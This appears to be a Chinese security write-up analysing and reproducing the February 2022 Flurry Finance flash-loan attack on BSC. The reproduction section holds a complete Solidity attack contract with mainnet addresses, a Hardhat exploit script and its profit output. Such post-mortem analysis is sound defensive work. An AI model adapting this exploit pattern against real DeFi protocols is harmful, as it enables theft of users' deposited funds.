# Flurry Finance 攻击事件分析与复现

## 写在前面

本文为 Cobo Labs 文章的初稿，文章有些地方欠打磨，完全版本请参考下面的链接：

https://mp.weixin.qq.com/s/6uBN4CprsTK5QooQpeeSmA

https://mp.weixin.qq.com/s/spjhLaiAR_rTYm91jj3C8g


## 事件描述

2月23日，BSC 链上的 Flurry Finance 遭到攻击，导致协议中 Vault 合约中价值约 293,000 美元的资产被盗。


该项目引用的第三方合约 StrategyLiquidate.execute 合约函数存在漏洞，未验证传入的流动性代币地址的合法性，攻击者可以传入事先构造好的伪造代币地址执行恶意函数。此次攻击过程中，攻击者将恶意 ERC20 token 中的 approve 函数设置为调用 FlurryRebaseUpkeep.performUpkeep() 函数，该函数最终会调用 Vault 合约中的 rebase 函数，在闪电贷过程中更新了RhoToken Multiplier 系数使之低于正常值，攻击者随后以低 Multiplier 买入 RhoToken，而后再次调用 FlurryRebaseUpkeep.performUpkeep() 更新 Multiplier 系数使之回归正常。这一过程变相的增加了攻击者持有的资产，可以制造差价获利。


## Flurry Finance 简介


Flurry Finance 是一个投资聚合协议，用户可以向协议中存储稳定币（如 BUSD、USDT 等）换取等量的 RhoToken，通过协议内置的投资策略获取收益，用户可以随时取出对应的稳定币及其收益。


当用户将资产投入协议中，就可以使用协议内的投资策略来获取收益。


FlurryFinance只采用了部分最具有投资价值 DeFi 项目作为投资目标，具体项目以及对应的策略参考：https://docs.flurry.finance/flurry-finance/the-rhotoken/supporting-strategies


在默认情况下，用户存储稳定币换取的 RhoToken 数量和价格上的关系为1:1，但是不会产生收益。


当用户选择开启 rebase 选项后，用户的 RhoToken 余额在产生投资策略产生收益的过程中会增加，并且保持 RhoToken 和稳定币的1:1价格兑换关系。


实现 RhoToken 余额增长的底层逻辑是将用户的余额表示为实际存款与 Multiplier 的乘积。也就是说，用户 RhoToken 余额与 Multiplier 成正比。


RhoToken 余额计算合约代码如下（合约地址：0x228265b81Fe567E13e7117469521aa228afd1AF1）：


```solidity
    function balanceOf(address account) public view override(ERC20Upgradeable, IERC20Upgradeable) returns (uint256) {
        if (isRebasingAccount(account)) {
            return _timesMultiplier(_balances[account]);
        }
        return _balances[account];
    }
    function _timesMultiplier(uint256 input) internal view returns (uint256) {
        return (input * multiplier) / ONE;
    }
    function isRebasingAccount(address account) public view override returns (bool) {
        return
            (_rebaseOptions[account] == RebaseOption.REBASING) ||
            (_rebaseOptions[account] == RebaseOption.UNKNOWN && !account.isContract());
    }
```


这一关键的 Multiplier 计算是根据投资策略组合中所有策略合约中的资产总和来进行计算的。投资产生收益会使策略合约中资产增多，从而使对应的 Multiplier 越大；如果资产减少，则对应的 Multiplier 变小。具体来说，Multiplier = ( TVL - nonrebasingRho) / rebasingRho。


关于 Multiplier 计算的 Vault.rebase 函数实现如下（合约地址：0xD36cb819c9AEc58CBccC60cB3050B352C6c4a776）：

```solidity
    function rebase() external override onlyRole(REBASE_ROLE) whenNotPaused nonReentrant {
        IVaultConfig.Strategy[] memory strategies = config.getStrategiesList();


        uint256 originalTvlInRho = rhoToken().totalSupply();
        if (originalTvlInRho == 0) {
            return;
        }
        // rebalance fund
        _rebalance();
        uint256 underlyingInvested;
        for (uint256 i = 0; i < strategies.length; i++) {
            underlyingInvested += strategies[i].target.updateBalanceOfUnderlying();
        }
        uint256 currentTvlInUnderlying = reserve() + underlyingInvested;
        uint256 currentTvlInRho = (currentTvlInUnderlying * rhoOne()) / underlyingOne();
        uint256 rhoRebasing = rhoToken().unadjustedRebasingSupply();
        uint256 rhoNonRebasing = rhoToken().nonRebasingSupply();


        if (rhoRebasing < 1e18) {
            // in this case, rhoNonRebasing = rho TotalSupply
            uint256 originalTvlInUnderlying = (originalTvlInRho * underlyingOne()) / rhoOne();
            if (currentTvlInUnderlying > originalTvlInUnderlying) {
                // invested accrued interest
                // all the interest goes to the fee pool since no one is entitled for the interest.
                uint256 feeToMint = ((currentTvlInUnderlying - originalTvlInUnderlying) * rhoOne()) / underlyingOne();
                rhoToken().mint(address(this), feeToMint);
                feeInRho += feeToMint;
            }
            return;
        }


        // from this point forward, rhoRebasing > 0
        if (currentTvlInRho == originalTvlInRho) {
            // no fees charged, multiplier does not change
            return;
        }
        if (currentTvlInRho < originalTvlInRho) {//final branch in this attack
            // this happens when fund is initially deployed to compound and get balance of underlying right away
            // strategy losing money, no fees will be charged
            uint256 _newM = ((currentTvlInRho - rhoNonRebasing) * 1e36) / rhoRebasing;
            rhoToken().setMultiplier(_newM);
            return;
        }
        uint256 fee36 = (currentTvlInRho - originalTvlInRho) * config.managementFee();
        uint256 fee18 = fee36 / 1e18;
        if (fee18 > 0) {
            // mint vault's fee18
            rhoToken().mint(address(this), fee18);
            feeInRho += fee18;
        }
        uint256 newM = ((currentTvlInRho * 1e18 - rhoNonRebasing * 1e18 - fee36) * 1e18) / rhoRebasing;
        rhoToken().setMultiplier(newM);
    }
```


用户与 Flurry Finance 的交互接口为对应的Vault合约，用户的资金也是流向 Vault 中，并由 Vault 生成 RhoToken。


而用于 rebasing RhoToken 的 Multiplier 则是由对应的投资策略中的余额进行计算。


整个的项目逻辑为：用户将稳定币存入对应的 Vault，对应的策略组从 Vault 中取钱进行投资，根据投资策略所产生的收益计算 Multiplier，通过 rebase 以增发代币数量的方式给用户分配收益。


## 攻击流程分析


攻击者地址：


0x2A1F4cB6746C259943f7A01a55d38CCBb4629B8E


0x0F3C0c6277BA049B6c3f4F3e71d677b923298B35


攻击合约地址：


0xB7A740d67C78bbb81741eA588Db99fBB1c22dFb7


被攻击的 Vault：


0x4bad4d624fd7cabeeb284a6cc83df594bfdf26fd


查看其交易序列可以发现明显的pattern：


![image-20220403195236764](https://s3cunDa.github.io/assets/post/image-20220403195236764.png)


即先进行初始化工作，然后使用 EOA 地址调用 bank.work 函数，最后调用套利函数。后面的交易都是重复调用 work 函数和套利这两个操作。


### 初始化工作


交易hash：0xd771f2263aa1693bddbcaaf66e2864417d7382c96b706b3894edd024da772009


主要做的工作如下：


1. 获取 Vault 的 RhoToken 地址：0xd845da3ffc349472fe77dfdfb1f93839a5da8c96
2. 获取 Vault 的 underlying 地址：0x55d398326f99059ff775485246999027b3197955（BUSD）
3. 将用户（攻击合约）的 rebase 选项设置为 true。
4. 用户（攻击合约）的 RhoToken 和 BUSD approve给 Vault。
5. 将用户（攻击合约）的 BUSD approve 给 PancakeRouter。
6. 向攻击者之前创建的魔改ERC20代币（攻击合约）和 BUSD 对组成 Pancake LP Token。
7. 将前一步产生的 LP Token 转账到攻击目标 strategy 地址，用于绕过后续函数的判定条件使用。
8. 向 Vault 合约传入 BUSD，mint 出 RhoToken。
9. 调用 performUpKeep，更新 Multiplier。
10. 调用 redeem 销毁 RhoToken 取出 BUSD。


那么从以上的准备工作可以看出，用户前期只需要创建恶意的交换对以及恶意 token，然后向这一交换对中注入一定的资金。在这里注入多少资金没有限制，只需要满足 strategy 地址有 LP存量即可（用于满足后续 strategy 操作）。


至于后面的8-10步，只是为了测试对应 Vault 的功能，在后续攻击过程中没有意义，所以可以省略。


### 操纵 Multiplier 


交易hash： 0xa4da20133835e1a39f63e9eb35a1ba2a318a96a26681f700778602b284e91f2a


这个 work 函数是直接调用的 bank 合约，也就是实行攻击的这一步。


这里需要说明，bank 合约并不属于 FlurryFinance 协议，而是 RabbitFinance 的协议合约。


由于 FlurryFInance 将 RabbitFinance 作为投资对象，所以相应的投资策略会根据 RabbitFinance 进行编写。


在本例中，用户是直接调用的 RabbitFinance bank 合约的 work 函数执行闪电贷逻辑，虽然没有调用 FlurryFinance 的策略，但是由于后续的 rebase 操作是直接用 bank 的标的资产余额进行 Multiplier 的计算，所以攻击者可以采用直接调用 bank 中 work 函数的方式来改变余额。


work 函数执行闪电贷逻辑，将对应 production 的借款 approve 给 Goblin 地址，调用` Goblin(production.goblin).work{value:sendBNB}(posId, msg.sender, production.borrowToken, borrow, debt, data);`， 由 Goblin 完成后续的步骤。


攻击者在这一交易中，输入的 posId 为0，代表新增一个借款状态；pid 为15，对应的 production 为 BUSD；borrow 为 bank 合约的BUSD余额；calldata 为打包的 strategy 地址和第一步生成的 fakeToken&BUSD pair 地址，用于后续漏洞利用。


bank 合约 work 函数实现（地址：0xc18907269640d11e2a91d7204f33c5115ce3419e）：

```solidity
    function work(uint256 posId, uint256 pid, uint256 borrow, bytes calldata data)
    external payable onlyEOA nonReentrant {


        if (posId == 0) {  // record borrow position
            posId = currentPos;
            currentPos ++;
            positions[posId].owner = msg.sender;
            positions[posId].productionId = pid;
            positions[posId].debtShare = 0;
            
            userPosition[msg.sender].push(posId);
        } else { 
            require(posId < currentPos, "bad position id");
            require(positions[posId].owner == msg.sender, "not position owner");
            pid = positions[posId].productionId; 
        }
 
        Production storage production = productions[pid];
        require(production.isOpen, 'Production not exists');
        require(borrow == 0 || production.canBorrow, "Production can not borrow");


        calInterest(production.borrowToken);


        uint256 debt = _removeDebt(posId, production).add(borrow);
        bool isBorrowBNB = production.borrowToken == address(0);


        uint256 sendBNB = msg.value;
        uint256 beforeToken = 0;
        if (isBorrowBNB) {
            sendBNB = sendBNB.add(borrow);
            require(sendBNB <= address(this).balance && debt <= banks[production.borrowToken].totalVal, "insufficient BNB in the bank");
            beforeToken = address(this).balance.sub(sendBNB);
        } else { //record balance before flashloan
            beforeToken = SafeToken.myBalance(production.borrowToken);
            require(borrow <= beforeToken && debt <= banks[production.borrowToken].totalVal, "insufficient borrowToken in the bank");
            beforeToken = beforeToken.sub(borrow);
            SafeToken.safeApprove(production.borrowToken, production.goblin, borrow);
        }


        Goblin(production.goblin).work{value:sendBNB}(posId, msg.sender, production.borrowToken, borrow, debt, data);// do flahloan logic


        uint256 backToken = isBorrowBNB? (address(this).balance.sub(beforeToken)) :
            SafeToken.myBalance(production.borrowToken).sub(beforeToken);


        if(backToken > debt) { // if pay off the debt, just do the normal flash loan finalize work
            backToken = backToken.sub(debt);
            debt = 0;


            isBorrowBNB? SafeToken.safeTransferETH(msg.sender, backToken):
                SafeToken.safeTransfer(production.borrowToken, msg.sender, backToken);


        }else if (debt > backToken) { // does not pay off, then record to user debt
            debt = debt.sub(backToken);
            backToken = 0;


            require(debt >= production.minDebt && debt <= production.maxDebt, "Debt scale is out of scope");
            uint256 health = Goblin(production.goblin).health(posId, production.borrowToken);
            require(config.isStable(production.goblin),"!goblin");
            require(health.mul(production.openFactor) >= debt.mul(GLO_VAL), "bad work factor");
        
            _addDebt(posId, production, debt);
        }
        emit Work(posId, debt, backToken);
    }
```


Goblin 的 work 函数与 bank的 work 函数做的工作类似：首先从 calldata 中取出 strategy 地址（注意：需要是注册的合法 strategy），而后将之前 bank 合约 approve 给 Goblin 的借款转入到 Goblin 中，再将借款 approve 给用户传入的 strategy，最后再调用` Strategy(strategy).execute{value:msg.value}(user, borrowToken, borrow, debt, ext);`来进行后续操作。其中 ext 为 calldata 解码后的剩余部分，在本例中为 pair 的地址。
Goblin 的 work 函数实现（地址：0x5917e3c07ade0b0a827d7935a3b4aace5050d0dd）：


```solidity
    function work(uint256 id, address user, address borrowToken, uint256 borrow, uint256 debt, bytes calldata data)
        override
        external
        payable
        onlyOperator
        nonReentrant
    {
        require(borrowToken == token0 || borrowToken == token1 || borrowToken == address(0), "borrowToken not token0 and token1");


        // 1. Convert this position back to LP tokens.
        _removeShare(id,user);
        // 2. Perform the worker strategy; sending LP tokens + borrowToken; expecting LP tokens.
        (address strategy, bytes memory ext) = abi.decode(data, (address, bytes));
        require(okStrats[strategy], "unapproved work strategy");


        lpToken.transfer(strategy, lpToken.balanceOf(address(this)));


        // transfer the borrow token.
        if (borrow > 0 && borrowToken != address(0)) {
            borrowToken.safeTransferFrom(msg.sender, address(this), borrow);
            borrowToken.safeApprove(address(strategy), 0);
            borrowToken.safeApprove(address(strategy), uint256(-1));
        }
        Strategy(strategy).execute{value:msg.value}(user, borrowToken, borrow, debt, ext);


        // 3. Add LP tokens back to the farming pool.
        _addShare(id,user);


        if (borrowToken == address(0)) {
            SafeToken.safeTransferETH(msg.sender, address(this).balance);
        } else {
            uint256 borrowTokenAmount = borrowToken.myBalance();
            if(borrowTokenAmount > 0){
                SafeToken.safeTransfer(borrowToken, msg.sender, borrowTokenAmount);
            }
        }
    }
```


strategy 的 execute 函数是最终执行套利的函数。在本例中，用户传入的strategy逻辑为：

1. 从calldata中取得用户传入的pair地址（之前构造好的 fakeToken&BUSD pair）。
2. 将strategy中的LP取出。
3. 将LP中换出的资产全部换为borrowtoken。
4. 将所得收益全部转还给调用者（Goblin）。


值得注意的是，在攻击者使用的 strategy 的整个 execute 逻辑中，并没有使用到闪电贷的借款。


由于 strategy 的逻辑是将 LP 通过 removeLiquidity 换成 borrowToken（本例中为BUSD）和交易对中另一个 token（本例中为攻击者构造的fakeToken），然后再将其换为 borrowToken。在这一过程中 removeLiquidity 函数的 amount 参数在调用时是 balanceOf(strategy)，所以攻击者事先必须在准备工作阶段将 LP 转入到 strategy 中（准备阶段第7步），否则在最终调用的 pair.burn 函数中对于 amount 的检查会不通过。


stategy的execute的实现（地址：0x5085c49828b0b8e69bae99d96a8e0fcf0a033369）：


```solidity
    function execute(address /* user */, address borrowToken , uint256 /* borrow */, uint256 /* debt */, bytes calldata data)
        override
        external
        payable
        nonReentrant
    {
        // 1. Find out lpToken and liquidity.
        (address _lptoken) = abi.decode(data, (address));
        
        // 2. remove liq
        IUniswapV2Pair lpToken = IUniswapV2Pair(_lptoken);
        address token0 = lpToken.token0();
        address token1 = lpToken.token1();
        bool isBorrowBnb = borrowToken == address(0);
        require(borrowToken == token0 || borrowToken == token1 || isBorrowBnb, "borrowToken not token0 and token1");
        {
            lpToken.approve(address(router), uint256(-1));
            router.removeLiquidity(token0, token1, lpToken.balanceOf(address(this)), 0, 0, address(this), now);
        }
        
        // 3. swap
        borrowToken = isBorrowBnb ? WBNB : borrowToken;
        address tokenRelative = borrowToken == token0 ? token1 : token0;
        tokenRelative.safeApprove(address(router), 0);
        tokenRelative.safeApprove(address(router), uint256(-1));


        address[] memory path = new address[](2);
        path[0] = tokenRelative;
        path[1] = borrowToken;
        router.swapExactTokensForTokens(tokenRelative.myBalance(), 0, path, address(this), now);


        // 4. send
        safeUnWrapperAndAllSend(borrowToken,msg.sender);


    }
```


在整个流程中，贷款资金流为：
Bank->Goblin->bank，用户和 strategy 都没有接收或使用到闪电贷的贷款。


这一 strategy 从功能上看只是用于取款清算的正常操作，并不需要用到闪电贷的借款。


漏洞点出现在 strategy 的 execute 函数中，由于传入的 pair 由用户指定，造成了用户可以调用自定义 token 的 approve 函数，而这个函数一开始提到过，会调用 performUpKeep，重新计算 Multiplier。


```solidity
    function performUpkeep(bytes calldata performData) external override {
        lastTimeStamp = block.timestamp;
        for (uint256 i = 0; i < vaults.length; i++) {
            vaults[i].rebase();
        }
        performData;
    }
```

虽然在整个调用流程中并没有用到闪电贷的贷款，但是 bank 合约在执行过程中会将闪电贷贷款资金转入到 Goblin，同时攻击者后续通过 approve 函数调用 performUpkeep 进行 rebase 操作发生在闪电贷过程中，此时还没有进行还款操作，而 rebase 计算 Multiplier 时会将 bank 的 TVL 作为参数，TVL 减少则会导致 Multiplier 降低。


### 套利


攻击者利用之前的漏洞拉低了 RhoToken 的 Multiplier，通过闪电贷将大量BUSD存入被攻击Vault 中，而后调用 performUpkeep 再次更新币价使之回归正常值。此时攻击者获得了调用更新函数前后 Multiplier 变化产生的额外 RhoToken，此时将所有的 RhoToken 兑换成 BUSD 即可获利。


在第一次进行套利时，攻击者将所获收益通过 DEX 换为 BNB，为后续交易提供手续费。不过第一笔套利交易由于选择 DEX 的原因受到交易池流动性影响，其实攻击者是亏钱的（获得0.271 BNB 亏损 5,163.044 BUSD），可能是攻击者之前的测试环境 fork 的区块高度交易池状态和实际攻击时状态不同，不过不影响攻击者在后续的套利中将所亏资产取出。


余下的套利所做的工作相同：向 Vault 中以低 Multiplier 用 BUSD 购入 RhoToken，而后重新调整价格回归正常值，调用 redeem 获取BUSD，向攻击者创建的 pair 注入流动性并将生成的流动性转给 router 合约，用于重复之前的攻击过程。


值得注意的是在每次套利过程中攻击者都在获得RhoToken后创建了一个新的合约地址，用于中转攻击获得的BUSD。
由于攻击产生的收益取决于再次更新币价前后的 Multiplier 差值，而随着攻击的进行，Vault 中的 TVL 不断减小，而 Multiplier 也会随着TVL减小而降低，二者的差值也会随之降低。


攻击者将这一过程重复22次，直到产生的收益不明显后才停止攻击。


套利交易hash：

1. 0x180f5090b759aa5d28440ed42505d931b69b219405bcf8d906fb07b4e54b1f72
   攻击前的 Multiplier:         736330965110030102683823249054291830
   攻击后的 Multiplier:        806131197703144409045160777992431633
   获利：                        0.271 BNB（用于后续交易手续费）
   亏损：                        5,163.044 BUSD
2. 0x12ec3fa2db6b18acc983a21379c32bffb17edbd424c4858197ad2286b5e5d00a
   攻击前的 Multiplier：        578464499961764120573471189389933074
   攻击后的 Multiplier：        635904699755866524753262171687506365
   获利：                        39,632.576 BUSD
3. 0xe642b2ef05853cb7a0525620df798651dd247afd91cea077161139ff8dc920c6
   攻击前的 Multiplier：        458750804413394156631541766423903527
   攻击后的 Multiplier：        497409204145508848020636507303675471
   获利：                        33,751.190 BUSD
4. 0x38462191b28ad1c6acd3b507a7835b8e6488648a8bec1a123d9a3e46d2df77b2
   攻击前的 Multiplier：        363172132556908388297855360395698593
   攻击后的 Multiplier：        386277890473946534115125880551016677
   获利：                        28,061.713 BUSD
5. 0x09305208055607a47c6acc7a4a8ec0d15f4404027d194c8d6ca630ecad442ec0
   攻击前的 Multiplier：        281007735733422423662687909824855014
   攻击后的 Multiplier：        295013066093169918633944412219339640
   获利：                        23,664.004 BUSD
6. 0xf2c9a42db9fd59b74d98e8912ae732939c4b05cc800ad7c0384187bb51600d89
   攻击前的 Multiplier：        215307322888293240764327695363490923
   攻击后的 Multiplier：        223412335242692432652518083086856252
   获利：                        18,938.613 BUSD
7. 0x4b110ade24b5c0082d67f5b34061a71424e02d6737c07a13434ed8a83a32e793
   攻击前的 Multiplier：        163473629768603395170969185649103596
   攻击后的 Multiplier：        168091420568642768040418914603931083
   获利：                        14,849.886 BUSD
8. 0x715aba8ae32e3af83527465f1352e312b76e415d842419ad7c92c680a69dad10
   攻击前的 Multiplier：        123244822299975020159225231084415150
   攻击后的 Multiplier：        125845070554562058725972693442344806
   获利：                        11,464.628 BUSD
9. 0x35056a4b067efe3f9f4b4d54da3d60b31f2b6f19fdf8737bba6d36ec60f8ac8c
   攻击前的 Multiplier：        92414902485280019894950874273626609
   攻击后的 Multiplier：        93866312543066706630378031064589865
   获利：                        8,748.502 BUSD
10. 0xa1106187e06443f3af166cffbbfeafa1d24098f29623931cfc3e740e753d9be9
    攻击前的 Multiplier：        69013995970139255281825916266555571
    攻击后的 Multiplier：        69818895185289433081294791180767446
    获利：                        6,618.012 BUSD
11. 0xce13342d674de648329cf798513c39381afca3a8f1b5bf8de19115957100169a
    攻击前的 Multiplier：        51380175596580132051739284451276755
    攻击后的 Multiplier：        51824400270609092978049522150469135
    获利：                        4,974.047 BUSD
12. 0xf55e4c64c388348d4151b7c0d1d78cb4c284769b0c4db9037ff5c914acd45730
    攻击前的 Multiplier：        38164000752995314470903049679769736
    攻击后的 Multiplier：        38408298573053373059020324361848096
    获利：                        3,720.551 BUSD
13. 0x6cf3826a83be9d66368162ead802855833de44153bae4ca3b4ab1972fbb25f17
    攻击前的 Multiplier：        28298741620380003708716968225879013
    攻击后的 Multiplier：        28432738506736001726584908987494182
    获利：                        2,773.058 BUSD
14. 0xa4084f0f168b0618586c7defc133cb24222a57902eefbc3b2aa17ecbd974107e
    攻击前的 Multiplier：        20956877918063959446296840655109679
    攻击后的 Multiplier：        21030232789563682713802245672444781
    获利：                        2,061.433 BUSD
15. 0x1e60f8db85292508a83d5ffd715ba52d8b9eabfebaa36fa4c4f775240976a8ab
    攻击前的 Multiplier：        15505126855516280569149422449076448
    攻击后的 Multiplier：        15545226683471948904238865041483094
    获利：                        1,529.450 BUSD
16. 0x3defe8ccfa4bc186d072cfbaa1bc7ffab0a9172159b3cfceab0711ac53984fd4
    攻击前的 Multiplier：        11463836503759258173181289685883267
    攻击后的 Multiplier：        11485733259972728058268316445865348
    获利：                        1,133.051 BUSD
17. 0x4d50fa944decf665f7cbba8f0a3045aced97da67a2286dde0df9949b714bddf7
    攻击前的 Multiplier：        8471479510249052342484667006484364
    攻击后的 Multiplier：        8483428096537834064109494175832039
    获利：                        838.572 BUSD
18. 0xbfc55e7d55c0f4c9ad528ef23ac53006707c3c78b808591b8099144b32a8d1c7
    攻击前的 Multiplier：        6257807200573956958567542808342319
    攻击后的 Multiplier：        6264323544711541556844753339817969
    获利：                        620.142 BUSD
19. 0x99ea2244a42a4af4ff03700823794b20d748ebbaff69db1eb9cea68672f0f0a9
    攻击前的 Multiplier：        4621278722082414037079362210237067
    攻击后的 Multiplier：        4624831002469819022661899496907844
    获利：                        458.343 BUSD
20. 0xa787aad65f25379e0f79123a3e8a6b598a744474bc4a036297ff18f1c2f1ff1e
    攻击前的 Multiplier：        3412018151842586594291761250635265
    攻击后的 Multiplier：        3413954017219129197477077427372048
    获利：                        338.615 BUSD
21. 0xb3c78040e9ecda9206d80fe35d21c8b3eb6d0bf00bfae9406e98a518ffcd98f3
    攻击前的 Multiplier：        2518798630060791074084616854786699
    攻击后的 Multiplier：        2519853364488604026113489055333002
    获利：                        250.083 BUSD
22. 0x49bda2e53d55106f681c34543d81ac529d795cd0c0455eab0e9e1170e02d6103
    攻击前的 Multiplier：        1859201134131283278094197855329423
    攻击后的 Multiplier：        1859775696136645461169121916829974
    获利：                        184.655 BUSD


攻击者获利后，将所得收益转入tornado混币协议。至此整个攻击流程结束。


## 攻击复现


此次攻击事件中攻击者利用漏洞对合约进行了多次相同攻击，这里只取其中一例作为演示。


攻击合约：


```solidity
pragma solidity ^ 0.8.0;
interface IVault {
    function mint(uint256 amount) external;
    function redeem(uint256 amount) external;
}
interface IRhoToken  {
    function getMultiplier() external view returns (uint256 multiplier, uint256 lastUpdate);
    function setRebasingOption(bool isRebasing) external;
}
interface IERC20{
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}
interface IBANK{
    function work(uint256 posId, uint256 pid, uint256 borrow, bytes calldata data) external;
}
interface IPerform{
    function performUpkeep(bytes calldata performData) external;
}
interface IPancakeRouter01 {
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}
interface IPancakeFactory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}
interface IPancakePair {
    function transfer(address to, uint value) external returns (bool);
}
interface IFlashLoan{
    function flashLoan(
        uint256 baseAmount,
        uint256 quoteAmount,
        address assetTo,
        bytes calldata data
    ) external;
}
contract attack_erc20{
    address public owner;
    address public vaultAddress     = 0x4BAd4D624FD7cabEeb284a6CC83Df594bFDf26Fd;
    address public rebaseUpKeep     = 0xc8935Eb04ac1698C51a705399A9632c6FaeCa57f;
    address public rhoAddress       = 0xD845dA3fFc349472fE77DFdFb1F93839a5DA8C96;
    address public BUSDAddress      = 0x55d398326f99059fF775485246999027B3197955;
    address public Bank             = 0xbEEB9d4CA070d34c014230BaFdfB2ad44A110142;
    address public PancakeRouter    = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address public PancakeFactory   = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
    address public pair;
    address public strategy         = 0x5085c49828B0B8e69bAe99d96a8e0FCf0A033369;
    address public FLURRY           = 0x47c9BcEf4fE2dBcdf3Abf508f147f1bBE8d4fEf2;
    address public WBNB             = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address public flashloanAddress = 0xd69f6dBB7d75aa6089417BC6F94E6b26dd80ba1C;


    uint public BUSDBalanceBefore;
    uint public BUSDBalanceAfter;
    uint public rhoBefore;
    uint public rhoAfter;
    uint public Mbefore;
    uint public Mafter;
    uint public MAX = 115792089237316195423570985008687907853269984665640564039457584007913129639935;
    
    string public name = 'fake';
    string public symbol = 'FKT';
    uint8 public decimals = 18;  
    uint256 public totalSupply = 1e28; 
    mapping (address => mapping (address => uint256)) public allowance;
    mapping (address => uint256) public balanceOf;
    constructor(){
        owner = msg.sender;
        balanceOf[owner] = 1e18;
    }
    function _transfer(address _from, address _to, uint _value) internal {


        require(balanceOf[_from] >= _value);  
        require(balanceOf[_to] + _value > balanceOf[_to]);




        balanceOf[_from] -= _value; 
        balanceOf[_to] += _value;
    }


    function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender, _to, _value);
    }


    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }


    function approve(address _spender, uint _value) public returns (bool success){
        if(msg.sender == address(strategy)){
            IPerform(rebaseUpKeep).performUpkeep("0x");
        }
        allowance[msg.sender][_spender] = _value; 
        return true;
    }
    function init() public{
        require(msg.sender == owner);
        balanceOf[address(this)] = 1000000;
        IRhoToken(rhoAddress).setRebasingOption(true);


        IERC20(rhoAddress).approve(vaultAddress, MAX);
        IERC20(BUSDAddress).approve(vaultAddress, MAX);
        IERC20(BUSDAddress).approve(PancakeRouter, MAX);
        IERC20(address(this)).approve(PancakeRouter, MAX);
        IERC20(rhoAddress).approve(PancakeRouter, MAX);


        (, , uint lpamount ) = IPancakeRouter01(PancakeRouter).addLiquidity(BUSDAddress, address(this), 1000, 1000000, 0, 0, address(this), block.timestamp);
        pair = IPancakeFactory(PancakeFactory).getPair(BUSDAddress, address(this));
        IPancakePair(pair).transfer(strategy, lpamount);
        IVault(vaultAddress).mint(10000);
        IPerform(rebaseUpKeep).performUpkeep("0x");
        IVault(vaultAddress).redeem(IERC20(rhoAddress).balanceOf(address(this)));
    }
    function payday() public{
        IFlashLoan(flashloanAddress).flashLoan(0, IERC20(BUSDAddress).balanceOf(flashloanAddress) , address(this), "0x");
    }
    function  DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        BUSDBalanceBefore = IERC20(BUSDAddress).balanceOf(address(this));
        (Mbefore, ) = IRhoToken(rhoAddress).getMultiplier();
        IVault(vaultAddress).mint(IERC20(BUSDAddress).balanceOf(address(this)));
        rhoBefore = IERC20(rhoAddress).balanceOf(address(this));
        IPerform(rebaseUpKeep).performUpkeep("0x");


        (Mafter,) = IRhoToken(rhoAddress).getMultiplier();
        rhoAfter = IERC20(rhoAddress).balanceOf(address(this));
        IVault(vaultAddress).redeem(rhoAfter);
        BUSDBalanceAfter = IERC20(BUSDAddress).balanceOf(address(this));
        IERC20(BUSDAddress).transfer(flashloanAddress, quoteAmount);
    }
    
}
```


exp：


```js
cconst hre = require("hardhat");


async function main() {


    const BUSD = "0x55d398326f99059fF775485246999027B3197955";
    const BUSD_HOLDER = '0xEFDca55e4bCE6c1d535cb2D0687B5567eEF2AE83';
    const BANK_ADDR = '0xc18907269640D11E2A91D7204f33C5115Ce3419e';
    const STRATEGY = '0x5085c49828b0b8e69bae99d96a8e0fcf0a033369'


    let Hack = await hre.ethers.getContractFactory("attack_erc20");
    const hack = await Hack.deploy();
    await hack.deployed();
    console.log("attack contract deployed to:", hack.address);




    await hre.network.provider.request({
        method: "hardhat_impersonateAccount",
        params: [BUSD_HOLDER],
    });
    const signer = await hre.ethers.getSigner(BUSD_HOLDER)
    const IERC20 = await hre.ethers.getContractAt("contracts/attack.sol:IERC20", BUSD, signer);


    let amount =ethers.utils.parseEther('500.0');
    let tx = await IERC20.transfer(hack.address, amount);
    console.log('Transfer %s BUSD from %s to %s', amount, BUSD_HOLDER, hack.address);


    await hack.init();
    let pairAddr = await hack.pair();
    const IBANK = await hre.ethers.getContractAt("contracts/attack.sol:IBANK", BANK_ADDR, signer);


    let data = hre.ethers.utils.defaultAbiCoder.encode(['address', 'uint', 'uint', 'address' ,'uint'], [STRATEGY, 0x40, 0x40 ,pairAddr, 2]);




    let borrowAmount = await IERC20.balanceOf(BANK_ADDR);
    await IBANK.work(0, 15, borrowAmount, data);


    await hack.payday();
    let before = await hack.BUSDBalanceBefore();
    let after = await hack.BUSDBalanceAfter();
    let Mbefore = await hack.Mbefore();
    let Mafter = await hack.Mafter();
    let rhoBefore = await hack.rhoBefore();
    let rhoAfter = await hack.rhoAfter()


    console.log("attacker BUSD before: ", before);
    console.log("attacker BUSD after:  ", after);
    console.log("attacker Mbefore: ", Mbefore);
    console.log("attacker Mafter:  ", Mafter);
    console.log("attacker rho before: ", rhoBefore);
    console.log("attacker rho after:  ", rhoAfter);
    let income = after - before;
    console.log("attacker's income (one round): ", income);


}


main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
```


攻击效果：


```
attack contract deployed to: 0x4BCD98b42fd74c8f386E650848773e841A5d332B
Transfer 500000000000000000000 BUSD from 0xEFDca55e4bCE6c1d535cb2D0687B5567eEF2AE83 to 0x4BCD98b42fd74c8f386E650848773e841A5d332B
attacker BUSD before:  BigNumber { value: "216925749511343749783819" }
attacker BUSD after:   BigNumber { value: "243241994018308132214186" }
attacker Mbefore:  BigNumber { value: "751295189043933610649741873521230943" }
attacker Mafter:   BigNumber { value: "842438208885164038403099654469167639" }
attacker rho before:  BigNumber { value: "216925749511343749783819" }
attacker rho after:   BigNumber { value: "243241994018308132214186" }
attacker's income (one round):  2.631624427821847e+22
```


